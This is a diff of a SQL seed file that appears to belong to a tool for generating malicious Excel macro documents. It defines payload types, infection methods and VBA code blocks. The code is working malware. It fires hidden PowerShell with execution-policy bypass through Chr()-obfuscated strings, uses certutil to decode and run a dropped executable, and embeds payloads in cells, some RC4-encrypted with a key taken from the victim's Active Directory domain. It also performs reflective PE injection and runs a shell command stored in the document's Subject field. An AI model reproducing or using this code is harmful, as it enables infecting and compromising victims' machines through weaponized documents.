@@ -1,3 +1,5 @@
+PRAGMA journal_mode = OFF;
+
 CREATE TABLE `PayloadTypes` (
 	`ID`	        INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT UNIQUE,
 	`Name`	        TEXT NOT NULL,
@@ -125,7 +127,7 @@ INSERT INTO PayloadTypes (Name, Description) VALUES ('Shell Command', 'Standard 
 INSERT INTO PayloadTypes (Name, Description) VALUES ('PowerShell Script', 'A standard, non-base64 encoded powershell script to run');
 INSERT INTO PayloadTypes (Name, Description) VALUES ('Executable', 'Embeds an EXE into cells & fires');    
 INSERT INTO InfectionTypes (Name, Description, DocType) VALUES ('Shell Command', 'Uses Wscript.Shell to fire the command exactly as is in a hidden window. Be sure your escapes are correct.', 'xls');                                                                              --1
-INSERT INTO InfectionTypes (Name, Description, DocType) VALUES ('Cell Embed', 'Your `"go to`" for firing PowerShell scripts. Base64 encodes .ps1 payload then embeds into cells. Macro concatenates then fires directly with powershell. Payload does not touch disk.', 'xls');                        --2
+INSERT INTO InfectionTypes (Name, Description, DocType) VALUES ('Cell Embed', 'Your "go to" for firing PowerShell scripts. Base64 encodes .ps1 payload then embeds into cells. Macro concatenates then fires directly with powershell. Payload does not touch disk.', 'xls');                        --2
 INSERT INTO InfectionTypes (Name, Description, DocType) VALUES ('Cell Embed-nonB64', 'Embeds .ps1 into cells (no b64). Does NOT save payload to disk. Fires directly with powershell.exe. Recommended.', 'xls');                                                                    --3
 INSERT INTO InfectionTypes (Name, Description, DocType) VALUES ('Cell Embed-Encrypted', 'Embeds encrypted .ps1 into cells (no b64). Does NOT save payload to disk. Key is the user''s email domain (retrieved from AD). Fired directly with powershell.exe. Careful to escape properly.', 'xls');   --4
 INSERT INTO InfectionTypes (Name, Description, DocType) VALUES ('Certutil', 'Saves base64 encoded exe to text file then uses certutil to fire it. Thanks @mattifestation!', 'xls');                                                                                                 --5
@@ -179,23 +181,23 @@ INSERT INTO CodeBlocks (Name, BlockType, BlockText) VALUES ('CertUtil', 'exec', 
 Sub cutil(code As String)
     Dim x As String
     
-    x = `"-----BEG`" & `"IN CER`" & `"TIFICATE-----`"
+    x = "-----BEG" & "IN CER" & "TIFICATE-----"
     x = x + vbNewLine
     x = x + code
     x = x + vbNewLine
-    x = x + `"-----E`" & `"ND CERTIF`" & `"ICATE-----`"
+    x = x + "-----E" & "ND CERTIF" & "ICATE-----"
     
     Dim path As String
-    path = Application.UserLibraryPath & rndname & `".txt`"
-    expath = Application.UserLibraryPath & rndname & `".exe`"
+    path = Application.UserLibraryPath & rndname & ".txt"
+    expath = Application.UserLibraryPath & rndname & ".exe"
     
-    Set scr = CreateObject(`"Scr`" & `"ipting.FileSy`" & `"stemObject`")
+    Set scr = CreateObject("Scr" & "ipting.FileSy" & "stemObject")
     Set file = scr.CreateTextFile(path, True)
     file.Write x
     file.Close
 
     Shell (Chr(99) & Chr(101) & Chr(114) & Chr(116) & Chr(117) & Chr(116) & Chr(105) & Chr(108) & Chr(32) & _
-    Chr(45) & Chr(100) & Chr(101) & Chr(99) & Chr(111) & Chr(100) & Chr(101) & Chr(32) & path & `" `" & expath)
+    Chr(45) & Chr(100) & Chr(101) & Chr(99) & Chr(111) & Chr(100) & Chr(101) & Chr(32) & path & " " & expath)
     Sleep 2000
     Shell (expath)
 End Sub
@@ -205,9 +207,9 @@ End Sub
 -- 4
 INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('Sleep', 'declare', '
 #If VBA7 Then
-    Public Declare PtrSafe Sub Sleep Lib `"kernel32`" (ByVal dwMilliseconds As LongPtr) 
+    Public Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As LongPtr) 
 #Else
-    Public Declare Sub Sleep Lib `"kernel32`" (ByVal dwMilliseconds As Long) 
+    Public Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long) 
 #End If
 
 ');
@@ -227,11 +229,11 @@ INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('PSCellEmbed', 'harn
 Sub |RANDOMNAME|()
     Dim x, c As String
     x = GetVal(|STARTROW|, |ENDROW|, |COLUMN|)
-    c = `"poW`" & Chr(101) & Chr(114) & Chr(83) & Chr(104) & Chr(101) & Chr(76) & `"l.eXe -nop -noni `" & _
-    `"-win`" & Chr(100) & Chr(111) & Chr(119) & Chr(115) & Chr(116) & Chr(121) & Chr(108) & Chr(101) & Chr(32) & Chr(104) & Chr(105) & Chr(100) & _
-    `"den `" & Chr(45) & Chr(101) & Chr(120) & Chr(101) & Chr(99) & Chr(32) & Chr(98) & Chr(121) & Chr(112) & Chr(97) & Chr(115) & Chr(115) & `"`" & _
-    `" -e`" & `"nc `" & x
-    Set s = CreateObject(`"WsCrip`" & `"t.`" & `"Sh`" & `"ell`")
+    c = "poW" & Chr(101) & Chr(114) & Chr(83) & Chr(104) & Chr(101) & Chr(76) & "l.eXe -nop -noni " & _
+    "-win" & Chr(100) & Chr(111) & Chr(119) & Chr(115) & Chr(116) & Chr(121) & Chr(108) & Chr(101) & Chr(32) & Chr(104) & Chr(105) & Chr(100) & _
+    "den " & Chr(45) & Chr(101) & Chr(120) & Chr(101) & Chr(99) & Chr(32) & Chr(98) & Chr(121) & Chr(112) & Chr(97) & Chr(115) & Chr(115) & "" & _
+    " -e" & "nc " & x
+    Set s = CreateObject("WsCrip" & "t." & "Sh" & "ell")
     s.Run c, 0
 End Sub
 
@@ -242,10 +244,10 @@ INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('PSCellEmbedNonb64',
 Sub |RANDOMNAME|()
     Dim x As String
     x = GetVal(|STARTROW|, |ENDROW|, |COLUMN|)
-    x = Replace(x, `"`"`"`", `"\`"`"`")
+    x = Replace(x, """", "\""")
     Dim c As String
-    c = Chr(112) & Chr(79) & Chr(119) & Chr(69) & Chr(114) & Chr(83) & Chr(104) & Chr(69) & Chr(108) & Chr(76) & Chr(46) & Chr(101) & Chr(120) & Chr(69) & `" -nop -noni -windowstyle hidden -exec bypass -command `" & Chr(34) & x & Chr(34)
-    Set s = CreateObject(`"WsCrip`" & `"t.`" & `"Sh`" & `"ell`")
+    c = Chr(112) & Chr(79) & Chr(119) & Chr(69) & Chr(114) & Chr(83) & Chr(104) & Chr(69) & Chr(108) & Chr(76) & Chr(46) & Chr(101) & Chr(120) & Chr(69) & " -nop -noni -windowstyle hidden -exec bypass -command " & Chr(34) & x & Chr(34)
+    Set s = CreateObject("WsCrip" & "t." & "Sh" & "ell")
     s.Run c, 0
 End Sub
 
@@ -309,7 +311,7 @@ Function em()
         Chr(32) & Chr(39) & Chr(76) & Chr(68) & Chr(65) & Chr(80) & Chr(58) & Chr(47) & Chr(47) & rtdns & Chr(39) & Chr(32) & Chr(119) & Chr(104) & Chr(101) & Chr(114) & Chr(101) & Chr(32) & _
         Chr(111) & Chr(98) & Chr(106) & Chr(101) & Chr(99) & Chr(116) & Chr(67) & Chr(108) & Chr(97) & Chr(115) & Chr(115) & Chr(61) & Chr(39) & Chr(117) & Chr(115) & Chr(101) & Chr(114) & _
         Chr(39) & Chr(32) & Chr(97) & Chr(110) & Chr(100) & Chr(32) & Chr(115) & Chr(97) & Chr(109) & Chr(65) & Chr(99) & Chr(99) & Chr(111) & Chr(117) & Chr(110) & Chr(116) & Chr(78) & Chr(97) & Chr(109) & Chr(101) & Chr(61) & Chr(39) & _
-        (Environ`$(Chr(85) & Chr(115) & Chr(101) & Chr(114) & Chr(110) & Chr(97) & Chr(109) & Chr(101))) & Chr(39)
+        (Environ$(Chr(85) & Chr(115) & Chr(101) & Chr(114) & Chr(110) & Chr(97) & Chr(109) & Chr(101))) & Chr(39)
 
     com.Properties(Chr(83) & Chr(101) & Chr(97) & Chr(114) & Chr(99) & Chr(104) & Chr(115) & Chr(99) & Chr(111) & Chr(112) & Chr(101)) = 2
     Set ors = com.Execute
@@ -344,7 +346,7 @@ Public Function crc(sText As String, sKey As String) As String
 
     For lIdx = 0 To 255
         baS(lIdx) = lIdx
-        baK(lIdx) = Asc(Mid`$(sKey, 1 + (lIdx Mod Len(sKey)), 1))
+        baK(lIdx) = Asc(Mid$(sKey, 1 + (lIdx Mod Len(sKey)), 1))
     Next
     For lI = 0 To 255
         lJ = (lJ + baS(lI) + baK(lI)) Mod 256
@@ -360,7 +362,7 @@ Public Function crc(sText As String, sKey As String) As String
         bytSwap = baS(lI)
         baS(lI) = baS(lJ)
         baS(lJ) = bytSwap
-        crc = crc & Chr`$((pvC(baS((CLng(baS(lI)) + baS(lJ)) Mod 256), Asc(Mid`$(sText, lIdx, 1)))))
+        crc = crc & Chr$((pvC(baS((CLng(baS(lI)) + baS(lJ)) Mod 256), Asc(Mid$(sText, lIdx, 1)))))
     Next
 End Function
 
@@ -376,7 +378,7 @@ Public Function thd(sText As String) As String
     Dim lIdx            As Long
 
     For lIdx = 1 To Len(sText)
-        thd = thd & Right`$(`"0`" & Hex(Asc(Mid(sText, lIdx, 1))), 2)
+        thd = thd & Right$("0" & Hex(Asc(Mid(sText, lIdx, 1))), 2)
     Next
 End Function
 
@@ -384,7 +386,7 @@ Public Function fhd(sText As String) As String
     Dim lIdx            As Long
 
     For lIdx = 1 To Len(sText) Step 2
-        fhd = fhd & Chr`$(CLng(`"&H`" & Mid(sText, lIdx, 2)))
+        fhd = fhd & Chr$(CLng("&H" & Mid(sText, lIdx, 2)))
     Next
 End Function
 
@@ -395,7 +397,7 @@ INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('ShellCommand', 'har
 Sub |RANDOMNAME|()
     Dim c As String
     c = Chr(34) & |PAYLOADTEXT| & Chr(34)
-    Set s = CreateObject(`"WsCrip`" & `"t.`" & `"Sh`" & `"ell`")
+    Set s = CreateObject("WsCrip" & "t." & "Sh" & "ell")
     s.Run c, 0
 End Sub
 
@@ -408,13 +410,13 @@ Sub |RANDOMNAME|()
     x = GetVal(|STARTROW|, |ENDROW|, |COLUMN|)
     k = em()
     p = crc(fhd(CStr(x)), CStr(k))
-    p = Replace(p, `"`"`"`", `"\`"`"`")
+    p = Replace(p, """", "\""")
     Dim c As String
     c = Chr(112) & Chr(79) & Chr(119) & Chr(69) & Chr(114) & Chr(83) & Chr(104) & Chr(69) & Chr(108) & Chr(76) & Chr(46) & Chr(101) & Chr(120) & Chr(69) & Chr(32) & Chr(45) & Chr(110) & _
     Chr(111) & Chr(112) & Chr(32) & Chr(45) & Chr(110) & Chr(111) & Chr(110) & Chr(105) & Chr(32) & Chr(45) & Chr(119) & Chr(105) & Chr(110) & Chr(100) & Chr(111) & Chr(119) & Chr(115) & _ 
     Chr(116) & Chr(121) & Chr(108) & Chr(101) & Chr(32) & Chr(104) & Chr(105) & Chr(100) & Chr(100) & Chr(101) & Chr(110) & Chr(32) & Chr(45) & Chr(101) & Chr(120) & Chr(101) & Chr(99) & _
     Chr(32) & Chr(98) & Chr(121) & Chr(112) & Chr(97) & Chr(115) & Chr(115) & Chr(32) & Chr(45) & Chr(99) & Chr(111) & Chr(109) & Chr(109) & Chr(97) & Chr(110) & Chr(100) & Chr(32) & Chr(34) & p & Chr(34)
-    Set s = CreateObject(`"WsCrip`" & `"t.`" & `"Sh`" & `"ell`")
+    Set s = CreateObject("WsCrip" & "t." & "Sh" & "ell")
     s.Run c, 0
 End Sub
 
@@ -423,9 +425,9 @@ End Sub
 --15
 INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('WriteFile', 'util', '
 Function cfile(b As String)
-    pth = Application.UserLibraryPath & rndname & `".txt`"
+    pth = Application.UserLibraryPath & rndname & ".txt"
     Dim f As Object
-    Set f = CreateObject(`"Sc`" & `"riptin`" & `"g.Fil`" & `"eSyst`" & `"emObj`" & `"ect`")
+    Set f = CreateObject("Sc" & "riptin" & "g.Fil" & "eSyst" & "emObj" & "ect")
     Dim oF As Object
     Set oF = f.CreateTextFile(pth)
     oF.WriteLine b
@@ -441,17 +443,17 @@ Sub |RANDOMNAME|()
     Dim x, irpei, c, p1, p2 As String
     p1 = cfile(CStr(GetVal(|IRPEISTARTROW|, |IRPEIENDROW|, |IRPEICOLUMN|)))
     p2 = cfile(CStr(GetVal(|STARTROW|, |ENDROW|, |COLUMN|)))
-    c = `"cm`" & `"d /c `" & Chr(34) & `"%SystemRoot%\|SYSTYPE|\Window`" & `"sPowe`" & `"rShe`" & `"ll\v1.0\`" & Chr(112) & Chr(79) & _
+    c = "cm" & "d /c " & Chr(34) & "%SystemRoot%\|SYSTYPE|\Window" & "sPowe" & "rShe" & "ll\v1.0\" & Chr(112) & Chr(79) & _
     Chr(119) & Chr(69) & Chr(114) & Chr(83) & Chr(104) & Chr(69) & Chr(108) & Chr(76) & Chr(46) & Chr(101) & _
     Chr(120) & Chr(69) & Chr(32) & Chr(45) & Chr(119) & Chr(105) & Chr(110) & Chr(100) & Chr(111) & Chr(119) & _
-    Chr(115) & Chr(116) & Chr(121) & Chr(108) & Chr(101) & Chr(32) & `"|DEMOMODE|`" & Chr(32) & Chr(45) & Chr(101) & Chr(120) & Chr(101) & Chr(99) & Chr(32) & Chr(98) & Chr(121) & _
+    Chr(115) & Chr(116) & Chr(121) & Chr(108) & Chr(101) & Chr(32) & "|DEMOMODE|" & Chr(32) & Chr(45) & Chr(101) & Chr(120) & Chr(101) & Chr(99) & Chr(32) & Chr(98) & Chr(121) & _
     Chr(112) & Chr(97) & Chr(115) & Chr(115) & Chr(32) & Chr(45) & Chr(110) & Chr(111) & Chr(112) & Chr(32) & Chr(45) & _
     Chr(110) & Chr(111) & Chr(110) & Chr(105) & Chr(32) & Chr(45) & Chr(99) & Chr(111) & Chr(109) & Chr(109) & Chr(97) & _
-    Chr(110) & Chr(100) & Chr(32) & `"`$s=gc `" & p1 & `";`$f = gc `" & p2 & _
-    `";`$b = [System.Convert]::FromBas`" & `"e64String(`$f); `" & Chr(105) & Chr(101) & Chr(88) & _
-    `"([System.Text.Encoding]::Ascii.GetString([System.Convert]:`" & _
-    `":FromBas`" & `"e64String(`$s))); Invoke-Reflec`" & `"tivePEIn`" & `"jection -PEBytes `$b`" & Chr(34)
-    Set s = CreateObject(`"WsCrip`" & `"t.`" & `"Sh`" & `"ell`")
+    Chr(110) & Chr(100) & Chr(32) & "$s=gc " & p1 & ";$f = gc " & p2 & _
+    ";$b = [System.Convert]::FromBas" & "e64String($f); " & Chr(105) & Chr(101) & Chr(88) & _
+    "([System.Text.Encoding]::Ascii.GetString([System.Convert]:" & _
+    ":FromBas" & "e64String($s))); Invoke-Reflec" & "tivePEIn" & "jection -PEBytes $b" & Chr(34)
+    Set s = CreateObject("WsCrip" & "t." & "Sh" & "ell")
     s.Run c, 0
 End Sub
 
@@ -460,7 +462,7 @@ End Sub
 --17
 INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('Metadata', 'harness', '
 Function |RANDOMNAME|()
-    Shell (ActiveWorkbook.BuiltinDocumentProperties.Item(`"Subject`"))
+    Shell (ActiveWorkbook.BuiltinDocumentProperties.Item("Subject"))
 End Function
 
 ');
